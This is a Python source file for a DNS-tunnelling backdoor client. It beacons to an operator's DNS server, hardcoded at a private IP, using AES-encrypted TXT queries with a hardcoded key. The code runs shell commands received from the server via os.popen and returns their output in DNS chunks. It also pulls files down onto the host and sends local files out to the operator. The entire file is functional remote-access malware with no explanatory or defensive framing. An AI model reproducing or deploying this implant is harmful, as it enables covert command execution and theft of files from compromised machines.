import dns.resolver
import  re
import base64
from Crypto.Cipher import AES
import os
import binascii

class Client:
    def __init__(self,host,port):
        self.host=host
        self.port=port

    def beikon(self):
        hk={'cmd':self.cmd,'upload':self.upload,'download':self.download}
        demo='demo'
        demo=self.jiami(demo)
        bbc=self.fs(demo)
        kk=self.zz(bbc)
        jm=self.jiemi(kk.encode('utf-8'))
        if jm:
            while True:
                try:
                    g='ok'
                    demo = self.jiami(g)
                    bbc = self.fs(demo)
                    kk = self.zz(bbc)
                    jm = self.jiemi(kk.encode('utf-8'))
                    if jm in hk:
                        hk[jm]()
                except:
                    pass


    def fs(self,data):
        dns_query = dns.message.make_query("{}".format(data), dns.rdatatype.TXT)
        response = dns.query.udp(dns_query, self.host, port=int(self.port))
        a=response.to_text()
        return a

    def zz(self,data):
        sb=re.findall('.* 60',str(data))
        return str(sb[0]).replace('. 60','').replace('.com','')

    def add_to_16(self,text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def jiami(self,data):
        key='DD194FB8BA97C8BFDA635E3CE76809A2'.encode('utf-8')
        text=bytes.decode(base64.b64encode(str(data).encode('utf-8')))
        aes=AES.new(key,AES.MODE_ECB)
        encrypd=str(base64.encodebytes(aes.encrypt(self.add_to_16(text))),encoding='utf-8').replace('\n','')
        return encrypd

    def jiemi(self,data):
        key = 'DD194FB8BA97C8BFDA635E3CE76809A2'.encode('utf-8')
        aes=AES.new(key,AES.MODE_ECB)
        decode_encrypd = aes.decrypt(base64.decodebytes(data))
        return bytes.decode(base64.b64decode(bytes.decode(decode_encrypd).rstrip('\0')))

    def cmd(self):
        while True:
            g='cmd'
            demo = self.jiami(g)
            bbc = self.fs(demo)
            kk = self.zz(bbc)
            jm = self.jiemi(kk.encode('utf-8'))
            if jm == 'exit':
                break
            else:
                zx=os.popen(jm)
                if zx:
                    g=zx.read()
                    demos = self.jiami(g)
                    if len(demos)<64:
                        if len(demos)==0:
                            demos=self.jiami(jm)
                        bbc = self.fs(demos)
                        kk = self.zz(bbc)
                        jm = self.jiemi(kk.encode('utf-8'))
                        if jm:
                            continue
                    else:
                        g='long'
                        demo = self.jiami(g)
                        bbc = self.fs(demo)
                        kk = self.zz(bbc)
                        jm = self.jiemi(kk.encode('utf-8'))
                        if jm:
                            g = len(demos)
                            demo = self.jiami(g)
                            bbc = self.fs(demo)
                            kk = self.zz(bbc)
                            jm = self.jiemi(kk.encode('utf-8'))
                            if jm:
                                b=0
                                e=32
                                for u in demos:
                                    g=demos[b:e]
                                    b+=32
                                    e+=32
                                    bbc=self.fs(g)
                                    kk = self.zz(bbc)
                                    if kk=='break':
                                        break





    def upload(self):
        g = 'upload'
        names=''
        changdu=0
        data=''
        demo = self.jiami(g)
        bbc = self.fs(demo)
        kk = self.zz(bbc)
        if str(kk).isdigit()==True:
            changdu+=int(kk)
            while True:
                demo = self.jiami('jx')
                bbc = self.fs(demo)
                zz=self.zz(bbc)
                data+=zz
                if len(data)==changdu:
                    print(data)
                    demo = self.jiami('break')
                    self.fs(demo)
                    break

            do=self.jiami('name')
            bc=self.fs(do)
            zz=self.zz(bc)
            jbb=self.jiemi(zz.encode('utf-8'))
            names+=jbb
            ju=self.jiemi(data.encode('utf-8'))
            xj=open(r'{}'.format(names),'wb')
            xj.write(binascii.unhexlify(ju.encode('ascii')))
            xj.close()

            if os.path.exists(r'{}'.format(names)):
                do=self.jiami('cg')
                bk=self.fs(do)
            else:
                do = self.jiami('bcg')
                self.fs(do)

        elif str(kk)=='fuck':
            pass

    def download(self):
        d='download'
        demo = self.jiami(d)
        bbc = self.fs(demo)
        kk = self.zz(bbc)
        changdu=0
        a=0
        b=32
        jm=self.jiemi(kk.encode('utf-8'))
        print(jm)
        if os.path.exists(jm):
            dk=open(jm,'rb')
            jm = self.jiami(binascii.hexlify(dk.read()).decode('ascii'))
            changdu+=len(jm)
            print(changdu)
            cd= self.fs(changdu)
            zz=self.zz(cd)
            if zz:
                for x in jm:
                    print(1)
                    v=self.fs(jm[a:b])
                    jmb=self.zz(v)
                    if jmb=='break':
                        break
                    a+=32
                    b+=32

        else:
            self.fs('bcz')






if __name__ == '__main__':
    SERVER = "192.168.3.75"  # your DNS server
    PORT = 53  # DNS server port
    obk=Client(host=SERVER,port=PORT)
    obk.beikon()
